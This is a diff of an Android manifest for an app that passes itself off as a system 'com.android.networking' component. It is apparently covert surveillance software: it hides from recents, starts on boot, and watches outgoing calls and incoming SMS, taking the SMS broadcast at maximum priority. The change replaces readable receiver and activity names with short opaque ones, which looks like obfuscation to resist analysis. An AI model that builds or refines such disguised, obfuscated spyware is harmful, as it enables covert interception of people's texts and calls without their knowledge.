@@ -35,7 +35,7 @@
 
 	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@">
 	
-		<activity android:name="com.android.networking.gui.AndroidServiceGUI"
+		<activity android:name="com.android.networking.gui.AGUI"
 			android:label="@string/app_name" android:excludeFromRecents="true"
 			android:enabled="true">
 			<intent-filter>
@@ -44,14 +44,14 @@
 			</intent-filter>
 		</activity>
 
-		<service android:name="ServiceCore" android:exported="false"
+		<service android:name="com.android.networking.ServiceCore" android:exported="false"
 			android:excludeFromRecents="true">
 			<intent-filter>
 				<action android:name="com.android.networking.app"/>		
 			</intent-filter>
 		</service>
 
-		<receiver android:name="BroadcastMonitor">
+		<receiver android:name="BM">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
@@ -62,23 +62,20 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
 		</receiver>
-		
-		<receiver android:name="com.android.networking.listener.BatteryMonitor">
+
+		<receiver android:name="com.android.networking.listener.BAc">
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BroadcastMonitorAc">
+		<receiver android:name="com.android.networking.listener.BSt">
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BroadcastMonitorStandby">
-		</receiver>
-
-		<receiver android:name="com.android.networking.listener.BroadcastMonitorSms">
+		<receiver android:name="com.android.networking.listener.BSm">
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BroadcastMonitorCall"
+		<receiver android:name="com.android.networking.listener.BC"
 			android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
